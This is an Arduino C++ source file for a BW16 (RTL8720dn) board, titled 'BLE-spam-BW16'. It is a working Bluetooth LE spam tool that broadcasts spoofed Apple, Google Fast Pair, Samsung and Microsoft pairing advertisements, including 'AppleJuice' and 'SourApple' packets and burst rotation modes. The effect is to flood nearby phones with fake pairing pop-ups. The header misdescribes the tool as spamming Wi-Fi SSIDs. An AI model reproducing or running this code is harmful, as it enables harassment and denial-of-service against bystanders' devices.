/*
                                     _     
        ___ _ __  _ __ ___ _ __  ___(_)___ 
        / __| '_ \| '__/ _ \ '_ \/ __| / __|
        \__ \ |_) | | |  __/ | | \__ \ \__ \
        |___/ .__/|_|  \___|_| |_|___/_|___/
            |_|                             
                © Copyright 2025
            ✈ https://github.com/sprensis
    Name: BLE-spam-BW16 (RTL8720dn)
    Description: Spams multiple BLE access points with custom SSIDs on all 2.4 GHz channels (1–11).
    Author: @sprensis
    Platform: BW16 (RTL8720dn) - Ameba Arduino
    License: MIT
*/

#include "ble_spam.h"

// Static buffers for advertisement assembly
static char gMsNameBuf[16];
static uint8_t gMsPayloadBuf[32];
static uint8_t gGoogleBuf[14];
static BLEAdvertData gAdvData;

// Burst mode state
static bool gBurstMode = false;
static size_t gBurstAppleIndex = 0;
static size_t gBurstGoogleIndex = 0;
static uint8_t gBurstPhase = 0;
static unsigned long gLastBurstMs = 0;
static unsigned long gIntervalMs = 80; // default rotation
static const unsigned long kIntervalDefault = 80;
static const unsigned long kIntervalAndroid = 60; // faster for Android burst
static bool gAndroidOnlyBurst = false;

// IOS-Devices
uint8_t Airpods[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t AirpodsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t AirpodsMax[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t AirpodsGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t AirpodsGen3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t AirpodsProGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t PowerBeats[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t PowerBeatsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsSoloPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsStudioBuds[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsFlex[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; 
uint8_t BeatsX[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsSolo3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsStudio3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsStudioPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsFitPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsStudioBudsPlus[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t AppleTVSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleTVPair[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleTVNewUser[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleTVAppleIDSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleTVWirelessAudioSync[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleTVHomekitSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleTVKeyboard[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleTVConnectingToNetwork[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t HomepodSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t SetupNewPhone[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t TransferNumber[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t TVColorBalance[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleVisionPro[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

// Android-Devices
const Device devices[] = {
    {"Bisto CSR8670 Dev Board", 0x0001F0},
    {"Arduino 101", 0x000047},
    {"Arduino 101 2", 0x470000},
    {"Anti-Spoof Test", 0x00000A},
    {"Google Gphones", 0x00000B},
    {"Android Auto", 0x000007},
    {"Test Android TV", 0x000009},
    {"Test Android TV 2", 0x090000},
    {"Fast Pair Headphones", 0x000048},
    {"LG HBS1110", 0x001000},
    {"Smart Controller 1", 0x00B727},
    {"BLE-Phone", 0x01E5CE},
    {"Goodyear", 0x0200F0},
    {"Smart Setup", 0x00F7D4},
    {"Goodyear 2", 0xF00002},
    {"T10", 0xF00400},
    {"ATS2833_EVB", 0x1E89A7},
    {"Bose NC 700", 0xCD8256},
    {"Bose QuietComfort 35 II", 0x0000F0},
    {"Bose QuietComfort 35 II 2", 0xF00000},
    {"JBL Flip 6", 0x821F66},
    {"JBL Buds Pro", 0xF52494},
    {"JBL Live 300TWS", 0x718FA4},
    {"JBL Everest 110GA", 0x0002F0},
    {"Pixel Buds", 0x92BBBD},
    {"Google Pixel Buds", 0x000006},
    {"Google Pixel Buds 2", 0x060000},
    {"Sony XM5", 0xD446A7},
    {"DENON AH-C830NCW", 0x038B91},
    {"JBL LIVE FLEX", 0x02F637},
    {"JBL REFLECT MINI NC", 0x02D886},
    {"JBL VIBE BEAM", 0xF00E97},
    {"JBL WAVE BEAM", 0x04ACFC},
    {"Beoplay H4", 0x04AA91},
    {"JBL TUNE 720BT", 0x04AFB8},
    {"WONDERBOOM 3", 0x05A963},
    {"B&O Beoplay E6", 0x05AA91},
    {"JBL LIVE220BT", 0x05C452},
    {"Sony WI-1000X", 0x05C95C},
    {"JBL Everest 310GA", 0x0602F0},
    {"LG HBS-1700", 0x0603F0},
    {"SRS-XB43", 0x1E8B18},
    {"WI-1000XM2", 0x1E955B},
    {"Sony WF-SP700N", 0x1EC95C},
    {"Galaxy S21 5G", 0x06AE20},
    {"OPPO Enco Air3 Pro", 0x06C197},
    {"Sony WH-1000XM2", 0x06C95C},
    {"soundcore Liberty 4 NC", 0x06D8FC},
    {"Technics EAH-AZ60M2", 0x0744B6},
    {"WF-C700N", 0x07A41C},
    {"Nest Hub Max", 0x07F426},
    {"JBL TUNE125TWS", 0x054B2D},
    {"JBL LIVE770NC", 0x0660D7},
    {"LG HBS-835", 0x0103F0},
    {"LG HBS-2000", 0x0903F0},
    {"Flipper Zero", 0xD99CA1},
    {"Free Robux", 0x77FF67},
    {"Free VBucks", 0xAA187F},
    {"Rickroll", 0xDCE9EA},
    {"Animated Rickroll", 0x87B25F},
    {"BLM", 0x1448C9},
    {"Obama", 0x7C6CDB},
    {"FBI", 0xE2106F},
    {"Tesla", 0xB37A62},
    {"Ton Upgrade Netflix", 0x92ADC9},
    {"Fallback Watch", 0x1A},
    {"White Watch4 Classic 44m", 0x01},
    {"Black Watch4 Classic 40m", 0x02},
    {"White Watch4 Classic 40m", 0x03},
    {"Black Watch4 44mm", 0x04},
    {"Black Watch4 40mm", 0x07},
    {"White Watch4 40mm", 0x08},
    {"Black Watch5 44mm", 0x11},
    {"Black Watch5 Pro 45mm", 0x15},
    {"White Watch5 44mm", 0x17},
    {"White & Black Watch5", 0x18},
    {"Black Watch6 Classic 43m", 0x1E},
};
const int devicesCount = sizeof(devices) / sizeof(devices[0]);

// Apple Devices Mapping
const AppleDeviceMapping appleDevices[] = {
    {Airpods, 31, "Airpods"},
    {AirpodsPro, 31, "AirpodsPro"},
    {AirpodsMax, 31, "AirpodsMax"},
    {AirpodsGen2, 31, "AirpodsGen2"},
    {AirpodsGen3, 31, "AirpodsGen3"},
    {AirpodsProGen2, 31, "AirpodsProGen2"},
    {PowerBeats, 31, "PowerBeats"},
    {PowerBeatsPro, 31, "PowerBeatsPro"},
    {BeatsSoloPro, 31, "BeatsSoloPro"},
    {BeatsStudioBuds, 31, "BeatsStudioBuds"},
    {BeatsFlex, 31, "BeatsFlex"},
    {BeatsX, 31, "BeatsX"},
    {BeatsSolo3, 31, "BeatsSolo3"},
    {BeatsStudio3, 31, "BeatsStudio3"},
    {BeatsStudioPro, 31, "BeatsStudioPro"},
    {BeatsFitPro, 31, "BeatsFitPro"},
    {BeatsStudioBudsPlus, 31, "BeatsStudioBudsPlus"},
    {AppleTVSetup, 23, "AppleTVSetup"},
    {AppleTVPair, 23, "AppleTVPair"},
    {AppleTVNewUser, 23, "AppleTVNewUser"},
    {AppleTVAppleIDSetup, 23, "AppleTVAppleIDSetup"},
    {AppleTVWirelessAudioSync, 23, "AppleTVWirelessAudioSync"},
    {AppleTVHomekitSetup, 23, "AppleTVHomekitSetup"},
    {AppleTVKeyboard, 23, "AppleTVKeyboard"},
    {AppleTVConnectingToNetwork, 23, "AppleTVConnectingToNetwork"},
    {HomepodSetup, 23, "HomepodSetup"},
    {SetupNewPhone, 23, "SetupNewPhone"},
    {TransferNumber, 23, "TransferNumber"},
    {TVColorBalance, 23, "TVColorBalance"},
    {AppleVisionPro, 23, "AppleVisionPro"}
};
const int appleDevicesCount = sizeof(appleDevices) / sizeof(appleDevices[0]);

// Function to generate random MAC address
void generateRandomMac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)random(0, 256);
        if (i == 0) { mac[i] |= 0xF0; }
    }
}

BLEAdvertData GetUniversalAdvertisementData(EBLEPayloadType Type) {
    BLEAdvertData advData;
    uint8_t i = 0;

    switch (Type) {
        case Microsoft: {
            const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            int len = (int)random(1, 11);
            if (len > 10) len = 10; // cap to buffer
            for (int j = 0; j < len; ++j) {
                gMsNameBuf[j] = charset[random(0, (int)strlen(charset))];
            }
            gMsNameBuf[len] = '\0';
            // Build static payload: manufacturer-specific 0xFF with Microsoft-like pattern
            i = 0;
            gMsPayloadBuf[i++] = (uint8_t)(6 + len);
            gMsPayloadBuf[i++] = 0xFF;
            gMsPayloadBuf[i++] = 0x06;
            gMsPayloadBuf[i++] = 0x00;
            gMsPayloadBuf[i++] = 0x03;
            gMsPayloadBuf[i++] = 0x00;
            gMsPayloadBuf[i++] = 0x80;
            memcpy(&gMsPayloadBuf[i], gMsNameBuf, len);
            i += len;
            advData.addData(gMsPayloadBuf, i);
            Serial.println("Adv: Microsoft payload generated");
            break;
        }
        case SourApple: {
            // Use a representative Apple packet (e.g., AirpodsProGen2)
            advData.addData(AirpodsProGen2, 31);
            Serial.println("Adv: SourApple (AirpodsProGen2)");
            break;
        }
        case AppleJuice: {
            int index = random(appleDevicesCount);
            uint8_t* packet = appleDevices[index].packet;
            uint8_t packetSize = appleDevices[index].size;
            advData.addData(packet, packetSize);
            Serial.print("Adv: Apple "); Serial.println(appleDevices[index].name);
            break;
        }
        case Samsung: {
            // Map to a specific Fast Pair model code (e.g., Galaxy S21 5G)
            const uint32_t model = 0x06AE20; // Galaxy S21 5G
            gGoogleBuf[0]  = 0x03; gGoogleBuf[1]  = 0x03; gGoogleBuf[2]  = 0x2C; gGoogleBuf[3]  = 0xFE;
            gGoogleBuf[4]  = 0x06; gGoogleBuf[5]  = 0x16; gGoogleBuf[6]  = 0x2C; gGoogleBuf[7]  = 0xFE;
            gGoogleBuf[8]  = (uint8_t)((model >> 0x10) & 0xFF);
            gGoogleBuf[9]  = (uint8_t)((model >> 0x08) & 0xFF);
            gGoogleBuf[10] = (uint8_t)((model >> 0x00) & 0xFF);
            gGoogleBuf[11] = 0x02; gGoogleBuf[12] = 0x0A; gGoogleBuf[13] = (uint8_t)(random(0, 120) - 100);
            advData.addData(gGoogleBuf, 14);
            Serial.println("Adv: Samsung Fast Pair");
            break;
        }
        case Google: {
            const uint32_t model = devices[random(0, devicesCount)].code;
            gGoogleBuf[0]  = 0x03; gGoogleBuf[1]  = 0x03; gGoogleBuf[2]  = 0x2C; gGoogleBuf[3]  = 0xFE;
            gGoogleBuf[4]  = 0x06; gGoogleBuf[5]  = 0x16; gGoogleBuf[6]  = 0x2C; gGoogleBuf[7]  = 0xFE;
            gGoogleBuf[8]  = (uint8_t)((model >> 0x10) & 0xFF);
            gGoogleBuf[9]  = (uint8_t)((model >> 0x08) & 0xFF);
            gGoogleBuf[10] = (uint8_t)((model >> 0x00) & 0xFF);
            gGoogleBuf[11] = 0x02; gGoogleBuf[12] = 0x0A; gGoogleBuf[13] = (uint8_t)(random(0, 120) - 100);
            advData.addData(gGoogleBuf, 14);
            Serial.println("Adv: Google Fast Pair");
            break;
        }
        case AndroidBurst: {
            const uint32_t model = devices[random(0, devicesCount)].code;
            gGoogleBuf[0]  = 0x03; gGoogleBuf[1]  = 0x03; gGoogleBuf[2]  = 0x2C; gGoogleBuf[3]  = 0xFE;
            gGoogleBuf[4]  = 0x06; gGoogleBuf[5]  = 0x16; gGoogleBuf[6]  = 0x2C; gGoogleBuf[7]  = 0xFE;
            gGoogleBuf[8]  = (uint8_t)((model >> 0x10) & 0xFF);
            gGoogleBuf[9]  = (uint8_t)((model >> 0x08) & 0xFF);
            gGoogleBuf[10] = (uint8_t)((model >> 0x00) & 0xFF);
            gGoogleBuf[11] = 0x02; gGoogleBuf[12] = 0x0A; gGoogleBuf[13] = (uint8_t)(random(0, 120) - 100);
            advData.addData(gGoogleBuf, 14);
            Serial.println("Adv: Android Fast Pair");
            break;
        }
        case AllBurst: {
            // Default selection for initial start; subsequent rotation handled in tickSpam()
            int index = random(appleDevicesCount);
            advData.addData(appleDevices[index].packet, appleDevices[index].size);
            Serial.println("Adv: Burst init (Apple)");
            break;
        }
        default: {
            Serial.println("Unsupported BLE payload type");
            break;
        }
    }

    return advData;
}

void executeSpam(EBLEPayloadType type) {
    BLEAdvertData advertisementData = GetUniversalAdvertisementData(type);

    BLE.init();
    BLE.beginPeripheral();

    BLEAdvert* advert = BLE.configAdvert();
    advert->stopAdv();
    advert->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
    advert->setAdvData(advertisementData);
    advert->updateAdvertParams();
    delay(50);
    advert->startAdv();
    delay(50);
    advert->stopAdv();
    BLE.end();
}

// New BW16 Ameba BLE control state and functions
static BLEAdvert* gAdvert = nullptr;
static bool gBleActive = false;
static EBLEPayloadType gCurrentType = AppleJuice;

void startSpam(EBLEPayloadType type) {
    gAdvData = GetUniversalAdvertisementData(type);
    if (!gBleActive) {
        BLE.init();
        BLE.beginPeripheral();
        Serial.println("BLE: initialized peripheral");
    }
    BLEAdvert* advert = BLE.configAdvert();
    gAdvert = advert;
    advert->stopAdv();
    advert->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
    advert->setAdvData(gAdvData);
    advert->updateAdvertParams();
    advert->startAdv();
    Serial.println("BLE: advertising started");
    gBleActive = true;
    gCurrentType = type;
    // enable burst mode if requested
    gBurstMode = (type == AllBurst || type == AndroidBurst);
    gAndroidOnlyBurst = (type == AndroidBurst);
    gIntervalMs = gAndroidOnlyBurst ? kIntervalAndroid : kIntervalDefault;
    gLastBurstMs = millis();
    if (gBurstMode) {
        gBurstAppleIndex = 0;
        gBurstGoogleIndex = 0;
        gBurstPhase = 0;
    }
}

void stopSpam() {
    if (gAdvert) {
        gAdvert->stopAdv();
        gAdvert = nullptr;
        Serial.println("BLE: advertising stopped");
    }
    if (gBleActive) {
        BLE.end();
        gBleActive = false;
        Serial.println("BLE: deinitialized");
    }
    gBurstMode = false;
}

bool isSpamActive() {
    return gBleActive;
}

void tickSpam() {
    if (!gBleActive || !gAdvert) return;
    unsigned long now = millis();
    if (now - gLastBurstMs < gIntervalMs) return;
    gLastBurstMs = now;

    if (!gBurstMode) {
        gAdvData = GetUniversalAdvertisementData(gCurrentType);
        gAdvert->stopAdv();
        gAdvert->setAdvData(gAdvData);
        gAdvert->updateAdvertParams();
        gAdvert->startAdv();
        return;
    }

    // Rotation schedule: Apple x3, Google x2, Microsoft x1 (repeat)
    EBLEPayloadType nextType;
    if (gAndroidOnlyBurst) {
        nextType = Google;
    } else {
        uint8_t slot = (gBurstPhase++ % 6);
        if (slot < 3) {
            nextType = AppleJuice;
        } else if (slot < 5) {
            nextType = Google;
        } else {
            nextType = Microsoft;
        }
    }

    // Build next adv data with deterministic progression for Apple/Google
    if (nextType == AppleJuice) {
        // sequential Apple for broader coverage
        BLEAdvertData adv;
        uint8_t* packet = appleDevices[gBurstAppleIndex % appleDevicesCount].packet;
        uint8_t size = appleDevices[gBurstAppleIndex % appleDevicesCount].size;
        adv.addData(packet, size);
        gAdvData = adv;
        gBurstAppleIndex++;
    } else if (nextType == Google) {
        BLEAdvertData adv;
        const uint32_t model = devices[gBurstGoogleIndex % devicesCount].code;
        gGoogleBuf[0]  = 0x03; gGoogleBuf[1]  = 0x03; gGoogleBuf[2]  = 0x2C; gGoogleBuf[3]  = 0xFE;
        gGoogleBuf[4]  = 0x06; gGoogleBuf[5]  = 0x16; gGoogleBuf[6]  = 0x2C; gGoogleBuf[7]  = 0xFE;
        gGoogleBuf[8]  = (uint8_t)((model >> 0x10) & 0xFF);
        gGoogleBuf[9]  = (uint8_t)((model >> 0x08) & 0xFF);
        gGoogleBuf[10] = (uint8_t)((model >> 0x00) & 0xFF);
        gGoogleBuf[11] = 0x02; gGoogleBuf[12] = 0x0A; gGoogleBuf[13] = (uint8_t)(random(0, 120) - 100);
        adv.addData(gGoogleBuf, 14);
        gAdvData = adv;
        gBurstGoogleIndex++;
    } else {
        gAdvData = GetUniversalAdvertisementData(Microsoft);
    }

    // Update advertisement payload
    gAdvert->stopAdv();
    gAdvert->setAdvData(gAdvData);
    gAdvert->updateAdvertParams();
    gAdvert->startAdv();
}